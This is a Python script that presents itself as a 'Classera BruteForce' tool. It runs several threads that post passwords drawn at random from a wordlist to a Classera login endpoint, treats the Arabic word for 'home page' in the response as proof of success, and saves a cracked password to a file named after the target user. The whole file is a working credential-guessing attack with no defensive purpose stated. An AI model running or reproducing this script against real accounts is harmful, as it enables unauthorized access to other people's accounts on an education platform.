from colorama import Fore, Style
import requests
import threading
import random
from config import *

#cool logo using artii api
ascii = requests.get('https://artii.herokuapp.com/make?text=Classera+BruteForce')
print(f'{Style.DIM}  {ascii.text} \ninsta: sloom0161')



#login function checks if username:pwd combo 
def login(user, pwd):
    log_res = requests.post(URL, headers=head, data=f'_method=POST&data%5BUser%5D%5Busername%5D={user}&data%5BUser%5D%5Bpassword%5D={pwd}')
    if 'الرئيسية' not in log_res.text: #if this string is not in the HTTP Response it wouldn't do anything
        print(f'{Fore.YELLOW}[+] Wrong pass {pwd}', end='\r') 
    elif 'الرئيسية' in log_res.text: #if the string is in the HTTP response it'll print it and store it in a file 
        print(f'{Fore.GREEN}[+] Correct password {pwd}')
        correct = open(f'{Target_user}.txt', 'w')
        correct.write(str(pwd))
        exit(0)



used_pass = []
#this function passes a random password to the login function and checks if it's not in the used_pass array 
def random_pass():
    while 1:
        try:
            pwd = pass_list[random.randint(0, len(pass_list))]
        except IndexError:
            print('Password not in list Exiting...')
            quit(1)
        if pwd not in used_pass:
            login(user=Target_user, pwd=pwd) #passes the password to the login function and 
            used_pass.append(pwd) 


#run threads  
def run_threads():
    Threads = []

    for i in range(int(get_threads)):
        t = threading.Thread(target=random_pass)
        t.daemon = True
        Threads.append(t)
    for i in range(int(get_threads)):
        Threads[i].start()

    for i in range(int(get_threads)):
        Threads[i].join()



(Target_user, get_threads) = get_user_input()

pass_list = get_list()

run_threads()